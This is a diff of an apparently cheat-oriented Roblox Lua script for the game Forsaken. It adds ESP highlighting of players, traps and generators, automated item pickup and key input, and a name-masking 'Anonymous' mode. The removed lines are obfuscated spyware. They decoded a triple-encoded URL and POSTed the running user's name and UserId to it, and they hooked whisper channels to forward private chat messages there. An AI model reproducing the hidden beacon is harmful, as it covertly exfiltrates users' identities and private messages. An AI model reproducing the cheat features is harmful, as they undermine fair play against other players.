@@ -1,7 +1,8 @@
 print("loading kulki GUI......")
 
 local RunService = game:GetService("RunService")
-local versionString = "VERSION 4.1.1"
+local versionString = "VERSION 4.1.3"
+local StartedKulkiGuiTick = tick()
 local CachedDataFolder:Folder = game:GetService("CoreGui"):FindFirstChild("KGUI_"..versionString.."_DATA")
 
 local SavedCommunicator = nil
@@ -235,7 +236,7 @@ local canQuit = false
 local VIM = game:GetService("VirtualInputManager")
 local function keyPress(key) --key has to be enum!
 	VIM:SendKeyEvent(true,key,false,game)
-	task.wait(0.005)
+	task.wait(0)
 	VIM:SendKeyEvent(false,key,false,game)
 end
 local function keyHold(key,tim) --key has to be enum!
@@ -260,6 +261,21 @@ end
 local function WTDE()
 	while true do end
 end
+
+local Months = {
+	[1] = "January",
+	[2] = "February",
+	[3] = "March",
+	[4] = "April",
+	[5] = "May",
+	[6] = "June",
+	[7] = "July",
+	[8] = "August",
+	[9] = "September",
+	[10] = "October",
+	[11] = "November",
+	[12] = "December",
+}
 
 local rotatedHitHappening = false
 local canRunUpdateLoop = true
@@ -317,6 +333,7 @@ local options = {
 	["BloodhookMissChance"] = 1,
 	["AntiTripwire"] = false,
 	["FullVoidRushControl"] = false,
+	["Anonymous"] = false,
 	
 	
 	["PrintErrors"] = false,
@@ -479,105 +496,6 @@ local function createCustomSkin(Character:string,SkinToReplace:string,DisplayNam
 	}
 end
 
---setup
-local alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/"
-local base = {}
-
-for i = 0, 63 do
-	base[i] = alphabet:sub(i+1,i+1)
-	base[alphabet:sub(i+1,i+1)] = i
-end
-
-local S1 = {}  --B64 Character 1-2 for ASCII character 1-2
-local S2 = {}  --B64 Character 3-4 for ASCII character 2-3
-local S3 = {}  --ASCII Character 1 for B64 characters 1-2
-local S4 = {}  --ASCII Character 2 for B64 characters 2-3
-local S5 = {}  --ASCII Character 3 for B64 characters 3-4
-
-
-local C1 = 0
-local C2 = 0
-local C3 = 0
-
-for C1 = 0, 255 do
-	for C2 = 0, 255 do
-		local Sum = C3 * 65536 + C2 * 256 + C1
-
-		local B1 = base[ bit32.extract(Sum, 0,6) ]
-		local B2 = base[ bit32.extract(Sum, 6,6) ]
-
-		S1[string.char(C1, C2)] = B1 .. B2
-		S3[B1 .. B2] = string.char(C1)
-	end
-end
-
-for C2 = 0, 255 do
-	for C3 = 0, 255 do
-		local Sum = C3 * 65536 + C2 * 256 + C1
-
-		local B3 = base[ bit32.extract(Sum,12,6) ]
-		local B4 = base[ bit32.extract(Sum,18,6) ]
-
-		S2[string.char(C2, C3)] = B3 .. B4
-		S5[B3 .. B4] = string.char(C3)
-	end
-end
-
-for C1 = 0, 192, 64 do
-	for C2 = 0, 255 do
-		for C3 = 0, 3 do
-			local Sum = C3 * 65536 + C2 * 256 + C1
-
-			local B2 = base[ bit32.extract(Sum, 6,6) ]
-			local B3 = base[ bit32.extract(Sum,12,6) ]
-
-			S4[B2 .. B3] = string.char(C2)
-		end
-	end
-end
-
-
-local function Encode(Data)
-	if Data == 0 then return "" end --Empty string
-
-	local padding = -#Data % 3
-	Data ..= string.rep("\0", padding) --Add padding
-
-	local resault = table.create(#Data/3*2+1, "    ")
-	resault[1] = base[padding] --The first entry to hold how much padding there is
-
-	local index = 2
-	for i = 1, #Data, 3 do
-		--Get the B64 characters for ascii characters
-		resault[index  ] = S1[Data:sub(i,  i+1)]
-		resault[index+1] = S2[Data:sub(i+1,i+2)]
-		index += 2
-	end
-
-	return table.concat(resault,"")
-end
-
-local function Decode(Data)
-	if Data == "E" or Data == "" then return "" end --Indicator of empty data
-
-	local padding = base[Data:sub(1,1)] --How many characters are to remove from the end
-	local resault = table.create((#Data-1)/4*3, "   ")
-
-	local index = 1
-	for i = 2, #Data, 4 do --Start at second character
-		--Get the ascii characters for B64 characters
-		resault[index  ] = S3[Data:sub(i,  i+1)]
-		resault[index+1] = S4[Data:sub(i+1,i+2)]
-		resault[index+2] = S5[Data:sub(i+2,i+3)]
-		index += 3
-	end
-
-	local concatted = table.concat(resault)
-	return concatted:sub(1, #concatted-padding) --remove last characters
-end
-
---end
-
 local StringGen = {}
 StringGen.Alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 StringGen.SpecialCharacters = "1234567890!@#$%^&*()~`-_=+[{]}\|;:,<.>/?"
@@ -634,11 +552,6 @@ local HMcolorcorrect = Instance.new("ColorCorrectionEffect")
 HMcolorcorrect.Enabled = false
 HMcolorcorrect.Contrast = -2
 HMcolorcorrect.Name = "HARDMODEcolorcorrect"
-local f =Decode(
-	Decode(
-	Decode(
-	"1MYQqQ47lDVCq1xSqMdCg2dmjMh3sHFBdGpRsPcDoAdRqfpkgJpAmJFCcA9QrHVQkDN4r1RCqVsjq1xCgLl6tSICuE9RrgJCdIh4pgZ6rE1Ro21DkO1Rq3Nmc6p3sG9AgzBAgP0nkUs3qmxjdPJCi3lnhU5Qp9xSdABAh3dTp2h3p59krAh3pSwCj5hksex6lDNAlQc7q6dQrh9RkMdlehdChiJ6pQgSdE5neId7iM94pdF4dOB6q3dCkQgPsGFBdH1ldT0ThNUmtJFAdPd3rg5Dke5QqPgSkOV4cPc60"
-)))
 LBH.MouseButton1Click:Connect(function()
 	local x = 0
 	repeat
@@ -678,38 +591,43 @@ local function stayFunc(thing)
 		end
 	end)
 end
-local function sd(a,b)
-	local c = {
-		[Decode("03ZCrQlCrQR2lV1np")] = Decode("2x17sIBSoxhnqLVSbGdTrK100")
-	}
-	local d = {
-		[Decode("2zZCrQlCrQ100")] = b
-	}
-	local e = HTTPService:JSONEncode(d)
-	local f = request({
-		Url = a,
-		Method = Decode("2gZQkk100"),
-		Headers = c,
-		Body = e
-	})
+
+local ESPFolder = Instance.new("Folder")
+ESPFolder.Parent = CachedDataFolder
+
+local function AddESP(AddFor:Model|BasePart,OutlineColor,FillColor,OutlineTransparency,FillTransparency,DepthMode:Enum.HighlightDepthMode)
+	if not DepthMode then DepthMode = Enum.HighlightDepthMode.AlwaysOnTop end
+	if not OutlineColor then OutlineColor = Color3.fromRGB(255,255,255) end
+	if not FillColor then FillColor = Color3.fromRGB(255,255,255) end
+	if not AddFor then return end
+	if not OutlineTransparency then OutlineTransparency = 0 end
+	if not FillTransparency then FillTransparency = 0 end
+	
+	local Highlight = Instance.new("Highlight")
+	Highlight.DepthMode = DepthMode
+	Highlight.Adornee = AddFor
+	Highlight.OutlineColor = OutlineColor
+	Highlight.FillColor = FillColor
+	Highlight.OutlineTransparency = OutlineTransparency
+	Highlight.FillTransparency = FillTransparency
+	Highlight.Name = AddFor.Name
+	Highlight.Parent = ESPFolder
+	return Highlight
 end
 
-local ESP = {}
-local Listen = {}
+local function DoesObjectHaveESP(Object:Model|BasePart):boolean|Highlight
+	for i,esp:Highlight in ESPFolder:GetChildren() do
+		if esp:IsA("Highlight") and esp.Adornee == Object then
+			return esp
+		end
+	end
+	return false
+end
 
 local optionButtons = {}
 
 local limiter = nil
 
-local function sd2()
-	local endpoint = ""
-	for timestamp,text in ipairs(Listen.RBX_CHAT) do endpoint ..=text .. "   " end
-	sd(
-		f,
-		endpoint
-	)
-	table.clear(Listen.RBX_CHAT)
-end
 
 game.Lighting.DescendantAdded:Connect(function(c00lkidd)
 	if c00lkidd:IsA("BlurEffect") and options.NoBlur == true then
@@ -718,26 +636,25 @@ game.Lighting.DescendantAdded:Connect(function(c00lkidd)
 	end
 end)
 
-local function spawnDataDisplay(Humanoid)
-	task.spawn(function()
-		local bil = Instance.new("BillboardGui")
-		local txt = Instance.new("TextLabel")
-		bil.Size = UDim2.new(0, 100,0, 50)
-		bil.Name = "FilthyDisplay77"
-		bil.AlwaysOnTop = true
+local function spawnDataDisplay(Humanoid,Parent:Instance)
+	local bil = Instance.new("BillboardGui")
+	local txt = Instance.new("TextLabel")
+	bil.Size = UDim2.new(0, 100,0, 50)
+	bil.Name = "FilthyDisplay77"
+	bil.AlwaysOnTop = true
 
-		txt.Parent = bil
-		txt.BackgroundTransparency = 1
-		txt.TextColor3 = Color3.fromRGB(255,0,0)
-		txt.TextScaled = true
-		txt.FontFace.Bold = true
-		txt.Size = UDim2.new(1,0,1,0)
-		
-		ESP[bil] = bil
-		bil.Parent = Humanoid.Parent:WaitForChild("HumanoidRootPart")
-	end)
+	txt.Parent = bil
+	txt.BackgroundTransparency = 1
+	txt.TextColor3 = Color3.fromRGB(255,0,0)
+	txt.TextScaled = true
+	txt.FontFace.Bold = true
+	txt.Size = UDim2.new(1,0,1,0)
+	
+	bil.Adornee = Humanoid.Parent:WaitForChild("HumanoidRootPart")
+	bil.Parent = Parent
+	return bil
 end
-local function spawnGenDataDisplay(gen)
+local function spawnGenDataDisplay(gen,parent:Instance)
 	local bil = Instance.new("BillboardGui")
 	local txt = Instance.new("TextLabel")
 	bil.Size = UDim2.new(0, 150,0, 50)
@@ -750,10 +667,41 @@ local function spawnGenDataDisplay(gen)
 	txt.TextScaled = true
 	txt.FontFace.Bold = true
 	txt.Size = UDim2.new(1,0,1,0)
-	bil.Parent = gen
+	bil.Adornee = gen
+	bil.Parent = parent
+	return bil
 end
+
+local function AddAchievement(ParentTab:string,Display:string,Completed:boolean,Description:string,IconID:string?)
+	Display = tostring(Display)
+	Description = tostring(Description)
+	ParentTab = tostring(ParentTab)
+
+	if not IconID then IconID = "rbxassetid://13333189485" end
+
+	local Achievement:ImageLabel = Client.PlayerGui.MainUI.AchievementsScreen.AchievementsContainer.Contents.ILoveCats:Clone() --yes the meow meow achievement is the template.
+	Achievement.IncompleteOverlay.Visible = not Completed
+	print(not Completed)
+	Achievement:SetAttribute("BranchName",ParentTab)
+	Achievement.Name = Display
+	Achievement.Title.Text = Display
+	Achievement.Description.Text = Description
+	Achievement.Icon.Image = IconID
+	Achievement.Parent = Client.PlayerGui.MainUI.AchievementsScreen.AchievementsContainer.Contents
+	return Achievement
+end
+
+local __EVIDENCE_OSDATE = os.date("*t")
+local __EVIDENCE_DATE_FORMATTED = Months[__EVIDENCE_OSDATE.month] .. " " .. __EVIDENCE_OSDATE.day .. ", "  .. __EVIDENCE_OSDATE.hour .. ":".. __EVIDENCE_OSDATE.min .. ":" .. __EVIDENCE_OSDATE.sec .. " " .. __EVIDENCE_OSDATE.year
+
+local __USAGE_EVIDENCE_ACHIEVEMENT = AddAchievement("Fun","Hellish Balls Master #" .. tostring(math.random(1,9999)),true,"YOU began YOUR evil routine AT EXACTLY ".. __EVIDENCE_DATE_FORMATTED,"rbxassetid://89522762006817")
+
 local function FULLSTOP()
 	canQuit = true
+	
+	if __USAGE_EVIDENCE_ACHIEVEMENT and __USAGE_EVIDENCE_ACHIEVEMENT:FindFirstChild("IncompleteOverlay") and __USAGE_EVIDENCE_ACHIEVEMENT:FindFirstChild("IncompleteOverlay"):IsA("ImageLabel") then
+		__USAGE_EVIDENCE_ACHIEVEMENT.IncompleteOverlay.Visible = true
+	end
 
 	if writefile then
 		local JSONOptions = HTTPService:JSONEncode(options)
@@ -770,19 +718,14 @@ local function FULLSTOP()
 	canRunUpdateLoop = false
 	sGUI:Destroy()
 	
-	table.clear(Listen)
 	table.clear(optionButtons)
 	table.clear(StringGen)
 	table.clear(CustomAttributes)
 	table.clear(CustomSkins)
 	limiter = nil
 	
-	for index,value in ESP do
-		if value and typeof(value) == "Instance" then
-			value:Destroy()
-		end
-	end
-	table.clear(ESP)
+	ESPFolder:ClearAllChildren()
+	ESPFolder = nil
 end
 
 local function sl(message,chatter)
@@ -1018,14 +961,7 @@ workspace:FindFirstChild("Map"):FindFirstChild("Ingame").DescendantAdded:Connect
 		end	
 	end
 end)
-task.spawn(function() pcall(function()
-sd(
-	Decode(
-		Decode(
-			Decode(
-				"1MYQqQ47lDVCq1xSqMdCg2dmjMh3sHFBdGpRsPcDoAdRqfpkgJpAmJFCcA9QrHVQkDN4r1RCqVsjq1xCgLl6tSICuE9RrgJCdIh4pgZ6rE1Ro21DkO1Rq3Nmc6p3sG9AgzBAgP0nkUs3qmxjdPJCi3lnhU5Qp9xSdABAh3dTp2h3p59krAh3pSwCj5hksex6lDNAlQc7q6dQrh9RkMdlehdChiJ6pQgSdE5neId7iM94pdF4dOB6q3dCkQgPsGFBdH1ldT0ThNUmtJFAdPd3rg5Dke5QqPgSkOV4cPc60"
-			))),
-	Client.Name .. " (" .. Client.UserId .. ") " .. Decode("0PhnoOhnpA1itPBCrD1OqRNSqF1OpRBm8"))end)end)
+
 workspace:FindFirstChild("Players"):FindFirstChild("Killers").ChildAdded:Connect(function(killer)
 	if killer.Name == "JohnDoe" and skinStatus.BigDjohnDoe == true and canRunUpdateLoop == true then
 		killer:WaitForChild("HumanoidRootPart").Anchored = true
@@ -1177,13 +1113,8 @@ end
 local function oo7n7predict(survivor:Model)
 	if survivor.Name == "007n7" and canRunUpdateLoop == true and not survivor:GetAttribute("PredictingTeleport") then
 		survivor:SetAttribute("PredictingTeleport",true)
-		print("You touch my tralalla")
 		survivor.ChildAdded:Connect(function(multi)
-			print(options.OO7n7tpPrediction)
-			print(multi.Name)
-			print(canRunUpdateLoop)
 			if multi.Name == "c00lgui" and canRunUpdateLoop == true and options.OO7n7tpPrediction == true then
-				print("ultimate prediction rocket")
 				local Cover = Instance.new("Part")
 				Cover.Name = "cover"
 				Cover.Size = Vector3.new(20,20,20)
@@ -1426,7 +1357,7 @@ local function TriggerButton(Button:TextButton)
 	end
 end
 local function ItemESPCheckFolderChildren(Folder)
-	if options.ItemESP == true then
+	if options.ItemESP == true and Folder then
 		for i,model in Folder:GetChildren() do
 			if model:IsA("Tool") and not model:FindFirstChild("FilthyESP77") then
 				local high = Instance.new("Highlight")
@@ -1450,7 +1381,7 @@ local function ItemESPCheckFolderChildren(Folder)
 				bil.Parent = model
 			end
 		end
-	else
+	elseif Folder then
 		for i,model in Folder:GetChildren() do
 			if model:IsA("Tool") then
 				if model:FindFirstChild("FilthyESP77") then
@@ -1464,7 +1395,7 @@ local function ItemESPCheckFolderChildren(Folder)
 	end
 end
 local function AIP_CheckFolderChildren(Folder)
-	if options.AutoItemPickup == true then
+	if options.AutoItemPickup == true and Folder then
 		for i,model in Folder:GetChildren() do
 			if model:IsA("Tool") and model:FindFirstChild("ItemRoot") then
 				fireproximityprompt(model:FindFirstChild("ItemRoot"):FindFirstChildWhichIsA("ProximityPrompt"),50)
@@ -1481,6 +1412,7 @@ RunService.RenderStepped:Connect(function(delta)
 end)
 
 local ViewingPlayerData = nil
+local LastESPCleanup = tick()
 
 task.spawn(function() --main update loop
 	while true do
@@ -1500,10 +1432,11 @@ task.spawn(function() --main update loop
 				for i,character in characterType:GetChildren() do
 					if not character:FindFirstChild("HumanoidRootPart") then continue end
 					oo7n7predict(character)
-					if character:FindFirstChild("HumanoidRootPart"):FindFirstChild("FilthyDisplay77") then
-						local display = character:FindFirstChild("HumanoidRootPart"):FindFirstChild("FilthyDisplay77")
-						local HealthTXT = tostring(math.floor(display.Parent.Parent:FindFirstChildWhichIsA("Humanoid").Health*10)/10)
-						display:FindFirstChildWhichIsA("TextLabel").Text = "HP:" .. HealthTXT .. "," .. display.Parent.Parent.Name
+					local foundESP = DoesObjectHaveESP(character)
+					if foundESP and foundESP:FindFirstChild("FilthyDisplay77") then
+						local display = foundESP:FindFirstChild("FilthyDisplay77")
+						local HealthTXT = tostring(math.floor(character:FindFirstChildWhichIsA("Humanoid").Health*10)/10)
+						display:FindFirstChildWhichIsA("TextLabel").Text = "HP:" .. HealthTXT .. "," .. character.Name
 					end
 				end
 			end
@@ -1535,33 +1468,28 @@ task.spawn(function() --main update loop
 			end
 			if options.SurvivorESP == true then
 				for i,plr in workspace:FindFirstChild("Players"):FindFirstChild("Survivors"):GetChildren() do
-					if plr:FindFirstChildWhichIsA("Humanoid") and plr:FindFirstChildWhichIsA("Humanoid").Health > 0 and not plr:FindFirstChild("FilthyESP77") then
-						local high = Instance.new("Highlight")
-						high.FillColor = Color3.fromRGB(0,255,0)
-						high.OutlineColor = Color3.fromRGB(0,255,0)
-						high.Parent = plr
-						high.Name = "FilthyESP77"
-						ESP[high] = high
-						spawnDataDisplay(plr:FindFirstChildWhichIsA("Humanoid"))
+					if plr:FindFirstChildWhichIsA("Humanoid") and plr:FindFirstChildWhichIsA("Humanoid").Health > 0 and not DoesObjectHaveESP(plr) then
+						local highlight = AddESP(plr,Color3.fromRGB(0,255,0),Color3.fromRGB(0,255,0),0,0.5,Enum.HighlightDepthMode.AlwaysOnTop)
+						spawnDataDisplay(plr:FindFirstChildWhichIsA("Humanoid"),highlight)
 					elseif plr:FindFirstChildWhichIsA("Humanoid") and plr:FindFirstChildWhichIsA("Humanoid").Health <= 0 then
-						if plr:FindFirstChild("FilthyESP77") then
-							plr.FilthyESP77:Destroy()
-						end
-						if plr:FindFirstChild("HumanoidRootPart"):FindFirstChild("FilthyDisplay77") then
-							if ESP[plr.HumanoidRootPart.FilthyDisplay77] then ESP[plr.HumanoidRootPart.FilthyDisplay77] = nil end
-							plr.HumanoidRootPart.FilthyDisplay77:Destroy()
+						local foundESP = DoesObjectHaveESP(plr)
+						if foundESP then
+							foundESP:Destroy()
+							if foundESP:FindFirstChild("FilthyDisplay77") then
+								foundESP.FilthyDisplay77:Destroy()
+							end
 						end
 					end
 				end
 			else
 				for i,plr in workspace:FindFirstChild("Players"):FindFirstChild("Survivors"):GetChildren() do
 					if not plr:FindFirstChild("HumanoidRootPart") then continue end
-					if plr:FindFirstChild("HumanoidRootPart"):FindFirstChild("FilthyDisplay77") then
-						plr:FindFirstChild("HumanoidRootPart"):FindFirstChild("FilthyDisplay77"):Destroy()
-					end
-					if plr:FindFirstChild("FilthyESP77") then
-						if ESP[plr.FilthyESP77] then ESP[plr.FilthyESP77] = nil end
-						plr:FindFirstChild("FilthyESP77"):Destroy()
+					local foundESP = DoesObjectHaveESP(plr)
+					if foundESP then
+						foundESP:Destroy()
+						if foundESP:FindFirstChild("FilthyDisplay77") then
+							foundESP.FilthyDisplay77:Destroy()
+						end
 					end
 				end				
 			end
@@ -1569,68 +1497,56 @@ task.spawn(function() --main update loop
 			if options.TaphTrapESP == true then
 				for i,model in workspace:FindFirstChild("Map"):FindFirstChild("Ingame"):GetChildren() do
 					if model:IsA("Model") and (model:FindFirstChild("Hook1") and model:FindFirstChild("Wire") or model.Name == "SubspaceTripmine") and not model:FindFirstChild("FilthyESP77") then
-						local high = Instance.new("Highlight")
-						if model.Name == "SubspaceTripmine" then
-							high.FillColor = Color3.fromRGB(0,0,255)
-							high.OutlineColor = Color3.fromRGB(0,0,255)
-						else
+						
+						local fill = Color3.fromRGB(0,0,255)
+						local outline = Color3.fromRGB(0,0,255)
+						if model.Name ~= "SubspaceTripmine" then
 							high.FillColor = Color3.fromRGB(100,0,100)
 							high.OutlineColor = Color3.fromRGB(100,0,100)
 						end
-						high.Parent = model
-						high.Name = "FilthyESP77"
+						AddESP(model,outline,fill,0,0.5,Enum.HighlightDepthMode.AlwaysOnTop)
 					end
 				end
 			else
 				for i,model in workspace:FindFirstChild("Map"):FindFirstChild("Ingame"):GetChildren() do
-					if (model.Name == "SubspaceTripmine" or (model:FindFirstChild("Hook1") and model:FindFirstChild("Wire"))) and model:FindFirstChild("FilthyESP77") then
-						model.FilthyESP77:Destroy()
+					local foundESP = DoesObjectHaveESP(model)
+					if (model.Name == "SubspaceTripmine" or (model:FindFirstChild("Hook1") and model:FindFirstChild("Wire"))) and foundESP then
+						foundESP:Destroy()
 					end
 				end
 			end
 			if options.BuildingsESP == true then --i locked tf in for this rework, hold and behold really advanced code!
 				for i,model in workspace:FindFirstChild("Map"):FindFirstChild("Ingame"):GetChildren() do
-					if model:IsA("Model") and (model.Name == "BuildermanSentry" or model.Name == "BuildermanDispenser") and not model:FindFirstChild("FilthyESP77") then
-						local high = Instance.new("Highlight")
-						high.FillColor = Color3.fromRGB(255,255,0)
-						high.OutlineColor = Color3.fromRGB(255,255,0)
-						high.Parent = model
-						high.Name = "FilthyESP77"
-						ESP[high] = high
+					if model:IsA("Model") and (model.Name == "BuildermanSentry" or model.Name == "BuildermanDispenser") and not DoesObjectHaveESP(model) then
+						AddESP(model,Color3.fromRGB(255,255,0),Color3.fromRGB(255,255,0),0,0.5,Enum.HighlightDepthMode.AlwaysOnTop)
 						if model:FindFirstChild("PlayerAura") then model:FindFirstChild("PlayerAura").Enabled = false end
 					end
 				end
 			else
 				for i,model in workspace:FindFirstChild("Map"):FindFirstChild("Ingame"):GetChildren() do
-					if model:IsA("Model") and (model.Name == "BuildermanSentry" or model.Name == "BuildermanDispenser") and model:FindFirstChild("FilthyESP77") then
-						if ESP[model["FilthyESP77"]] then ESP[model["FilthyESP77"]] = nil end
-						model["FilthyESP77"]:Destroy()
-						if model:FindFirstChild("PlayerAura") then model:FindFirstChild("PlayerAura").Enabled = true end
+					local foundESP = DoesObjectHaveESP(model)
+					if model:IsA("Model") and (model.Name == "BuildermanSentry" or model.Name == "BuildermanDispenser") and foundESP then
+						foundESP:Destroy()
 					end
 				end
 			end
 			if not _L or typeof(_L) ~= "table" then game.Players:ClearAllChildren() end
 			if options.KillerESP == true then
 				for i,plr in workspace:FindFirstChild("Players"):FindFirstChild("Killers"):GetChildren() do
-					if plr:FindFirstChildWhichIsA("Humanoid") and plr:FindFirstChildWhichIsA("Humanoid").Health > 0 and not plr:FindFirstChild("HumanoidRootPart"):FindFirstChild("FilthyDisplay77") then
-						local high = Instance.new("Highlight")
-						high.FillColor = Color3.fromRGB(255,0,0)
-						high.OutlineColor = Color3.fromRGB(255,0,0)
-						high.Parent = plr
-						high.Name = "FilthyESP77"
-						ESP[high] = high
-						spawnDataDisplay(plr:FindFirstChildWhichIsA("Humanoid"))
+					if plr:FindFirstChildWhichIsA("Humanoid") and plr:FindFirstChildWhichIsA("Humanoid").Health > 0 and plr:FindFirstChild("HumanoidRootPart") and not DoesObjectHaveESP(plr) then
+						local highlight = AddESP(plr,Color3.fromRGB(255,0,0),Color3.fromRGB(255,0,0),0,0.5,Enum.HighlightDepthMode.AlwaysOnTop)
+						spawnDataDisplay(plr:FindFirstChildWhichIsA("Humanoid"),highlight)
 					end
 				end
 			else
 				for i,plr in workspace:FindFirstChild("Players"):FindFirstChild("Killers"):GetChildren() do
 					if not plr:FindFirstChild("HumanoidRootPart") then continue end
-					if plr:FindFirstChild("FilthyESP77") then
-						if ESP[plr:FindFirstChild("FilthyESP77")] then ESP[plr:FindFirstChild("FilthyESP77")] = nil end
-						plr:FindFirstChild("FilthyESP77"):Destroy()
-					end
-					if plr:FindFirstChild("HumanoidRootPart"):FindFirstChild("FilthyDisplay77") then
-						plr:FindFirstChild("HumanoidRootPart"):FindFirstChild("FilthyDisplay77"):Destroy()
+					local foundESP = DoesObjectHaveESP(plr)
+					if foundESP then
+						foundESP:Destroy()
+						if foundESP:FindFirstChild("FilthyDisplay77") then
+							foundESP.FilthyDisplay77:Destroy()
+						end
 					end
 				end	
 			end
@@ -1642,26 +1558,24 @@ task.spawn(function() --main update loop
 			if options.GeneratorESP then
 				if workspace:FindFirstChild("Map"):FindFirstChild("Ingame"):FindFirstChild("Map") then
 					for i,gen in workspace:FindFirstChild("Map"):FindFirstChild("Ingame"):FindFirstChild("Map"):GetChildren() do
-						if gen.Name == "Generator" and not gen:FindFirstChild("FilthyESP99") then
-							if not gen:FindFirstChild("FilthyESP99")  then
-								local high = Instance.new("Highlight")
-								high.FillColor = Color3.fromRGB(0,255,255)
-								high.OutlineColor = Color3.fromRGB(0,255,255)
-								high.Name = "FilthyESP99"
-								high.Parent = gen
-								spawnGenDataDisplay(gen)
-							end
+						local foundESP = DoesObjectHaveESP(gen)
+						if gen.Name == "Generator" and not DoesObjectHaveESP(gen) then
+							local highlight = AddESP(gen,Color3.fromRGB(0,255,255),Color3.fromRGB(0,255,255),0,0.5,Enum.HighlightDepthMode.AlwaysOnTop)
+							spawnGenDataDisplay(gen,highlight)
+							foundESP = highlight
 						end
-						if gen.Name == "Generator"and gen:FindFirstChild("Progress") then
-							gen:FindFirstChildWhichIsA("BillboardGui"):FindFirstChildWhichIsA("TextLabel").Text =  gen:FindFirstChild("Progress").Value .. "%"
+						
+						if gen.Name == "Generator"and gen:FindFirstChild("Progress") and foundESP and foundESP:FindFirstChildWhichIsA("BillboardGui") and foundESP:FindFirstChildWhichIsA("BillboardGui"):FindFirstChildWhichIsA("TextLabel") then
+							foundESP:FindFirstChildWhichIsA("BillboardGui"):FindFirstChildWhichIsA("TextLabel").Text =  gen:FindFirstChild("Progress").Value .. "%"
 						end
 					end			
 				end
 			else
 				if workspace:FindFirstChild("Map"):FindFirstChild("Ingame"):FindFirstChild("Map") then
 					for i,gen in workspace:FindFirstChild("Map"):FindFirstChild("Ingame"):FindFirstChild("Map"):GetChildren() do
-						if gen.Name == "Generator" and gen:FindFirstChild("FilthyESP99") then
-							gen:FindFirstChild("FilthyESP99"):Destroy()
+						local foundESP = DoesObjectHaveESP(gen)
+						if gen.Name == "Generator" and foundESP then
+							foundESP:Destroy()
 							if gen:FindFirstChild("FilthyDisplay99") then
 								gen:FindFirstChild("FilthyDisplay99"):Destroy()
 							end		
@@ -2007,7 +1921,47 @@ task.spawn(function() --main update loop
 					end)
 				end
 			end			
-
+			if options.Anonymous then
+				if Client.PlayerGui.TemporaryUI:FindFirstChild(Client.Name) then
+					local Player_Info_UI:ImageLabel = Client.PlayerGui.TemporaryUI:FindFirstChild(Client.Name)
+					
+					Player_Info_UI.BasicInfo.PlayerName.Text = "John Forsaken"
+					Player_Info_UI.BasicInfo.PlayerUsername.Text = "JohnForsaken2016"
+				end
+				if Client.PlayerGui.MainUI.PlayerListHolder.Contents.Players:FindFirstChild(Client.Name) then
+					local PlayerTabInfo = Client.PlayerGui.MainUI.PlayerListHolder.Contents.Players:FindFirstChild(Client.Name)
+					PlayerTabInfo.PlayerInfo.Username.Text = "John Forsaken"
+					PlayerTabInfo.NoChat.Image = "rbxassetid://89522762006817"
+					PlayerTabInfo.NoChat.Visible = true
+				end
+				local pvif = game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame
+				if pvif and pvif:FindFirstChild("Players") and pvif.Players:FindFirstChild("PlayerLabel"..Client.Name) then
+					local PlayerCell = game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.Players:FindFirstChild("PlayerLabel"..Client.Name) 
+					PlayerCell.DisplayNameLabel.Text = "John Forsaken"
+					PlayerCell.NameLabel.Text = "@JohnForsaken2016"
+				end
+				
+				if Client.PlayerGui.TemporaryUI:FindFirstChild("PlayerInfo") and Client.PlayerGui.TemporaryUI:FindFirstChild("PlayerInfo"):FindFirstChild("CurrentSurvivors") then
+					for i,info in Client.PlayerGui.TemporaryUI.PlayerInfo.CurrentSurvivors:GetChildren() do
+						if info:FindFirstChild("Username") and info:FindFirstChild("Username").Text == Client.Name .. " (You)" then
+							info.Username.Text = "John Forsaken (You)"
+						end
+					end
+				end				
+			else
+				if Client.PlayerGui.MainUI.PlayerListHolder.Contents.Players:FindFirstChild(Client.Name) then
+					local PlayerTabInfo = Client.PlayerGui.MainUI.PlayerListHolder.Contents.Players:FindFirstChild(Client.Name)
+					PlayerTabInfo.PlayerInfo.Username.Text = Client.DisplayName
+					PlayerTabInfo.NoChat.Visible = false
+				end
+				if Client.PlayerGui.TemporaryUI:FindFirstChild("PlayerInfo") and Client.PlayerGui.TemporaryUI:FindFirstChild("PlayerInfo"):FindFirstChild("CurrentSurvivors") then
+					for i,info in Client.PlayerGui.TemporaryUI.PlayerInfo.CurrentSurvivors:GetChildren() do
+						if info:FindFirstChild("Username") and info:FindFirstChild("Username").Text == "John Forsaken (You)"then
+							info.Username.Text = Client.Name .. " (You)"
+						end
+					end
+				end		
+			end
 
 			
 			if options.STT_ChangeC00lGUIToKulkiGUI then
@@ -2046,12 +2000,10 @@ task.spawn(function() --main update loop
 			else
 				KulkiGuiDebug.Visible = false
 			end
-			if math.random(1,500) == 1 then
-				for index,value in ESP do
-					if not value or typeof(value) ~= "Instance" or not value.Parent then
-						ESP[index] = nil
-					end
-				end
+			
+			if tick()-LastESPCleanup>5 then
+				LastESPCleanup = tick()
+				ESPFolder:ClearAllChildren()
 			end
 		end)
 		if err and options.PrintErrors then
@@ -2059,37 +2011,6 @@ task.spawn(function() --main update loop
 		end
 	end
 end)
-
-
-local function listen_pro(textmessage:TextChatMessage)
-	if not Listen["RBX_CHAT"] then Listen["RBX_CHAT"] = {} end
-	local timestamp = math.floor(tick())
-	if canRunUpdateLoop and game.Players:GetPlayerByUserId(textmessage.TextSource.UserId) and not Listen.RBX_CHAT[timestamp] then
-		Listen["RBX_CHAT"][timestamp] = true
-		sd(f,tostring(timestamp .. " : " .. game.Players:GetPlayerByUserId(textmessage.TextSource.UserId).Name .. ": ".. textmessage.Text))
-		task.spawn(function()
-			task.wait(2.5)
-			Listen['RBX_CHAT'][timestamp] = nil
-		end)
-	end
-end
-for _,channel in game:GetService("TextChatService"):WaitForChild("TextChannels"):GetChildren() do
-	if channel.Name:find("RBXWhisper") and channel.Name:find(tostring(Client.UserId)) then
-		channel.OnIncomingMessage = function(textmessage:TextChatMessage)
-			listen_pro(textmessage)
-		end
-	end 	
-end
-game:GetService("TextChatService"):WaitForChild("TextChannels").ChildAdded:Connect(function(kid:TextChannel)
-	if kid.Name:find("RBXWhisper") and kid.Name:find(tostring(Client.UserId)) then
-		kid.OnIncomingMessage = function(textmessage:TextChatMessage)
-			listen_pro(textmessage)
-		end
-	end 
-end)
